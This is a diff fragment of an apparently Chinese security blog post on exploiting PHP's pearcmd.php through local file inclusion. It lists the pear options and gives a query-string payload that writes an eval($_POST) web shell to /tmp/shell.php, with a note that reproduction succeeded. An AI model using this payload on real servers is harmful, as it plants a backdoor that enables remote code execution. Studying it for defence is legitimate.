@@ -93,7 +93,7 @@
 <p>看看选项：</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@VM-0-6-ubuntu:~/somefile# pear help options</span><br><span class="line">Options:</span><br><span class="line">     -v         increase verbosity level (default 1)</span><br><span class="line">     -q         be quiet, decrease verbosity level</span><br><span class="line">     -c file    find user configuration in `file&#x27;</span><br><span class="line">     -C file    find system configuration in `file&#x27;</span><br><span class="line">     -d foo=bar set user config variable `foo&#x27; to `bar&#x27;</span><br><span class="line">     -D foo=bar set system config variable `foo&#x27; to `bar&#x27;</span><br><span class="line">     -G         start in graphical (Gtk) mode</span><br><span class="line">     -s         store user configuration</span><br><span class="line">     -S         store system configuration</span><br><span class="line">     -u foo     unset `foo&#x27; in the user configuration</span><br><span class="line">     -h, -?     display help/usage (this message)</span><br><span class="line">     -V         version information</span><br></pre></td></tr></table></figure>
 
-<p>相当于写配置到<code>/tmp/.feng.php</code>,payload如下：</p>
+<p>相当于写配置到<code>/tmp/shell.php</code>,payload如下：</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=/usr/local/lib/php/pearcmd.php&amp;+-c+/tmp/shell.php+-d+man_dir=&lt;?eval($_POST[&#x27;x&#x27;]);?&gt;+-s+</span><br></pre></td></tr></table></figure>
 
 <p>复现成功：<br><img src="/2024/04/28/pearcmd.php/image-20240428032008052.png" alt="image-20240428032008052"></p>
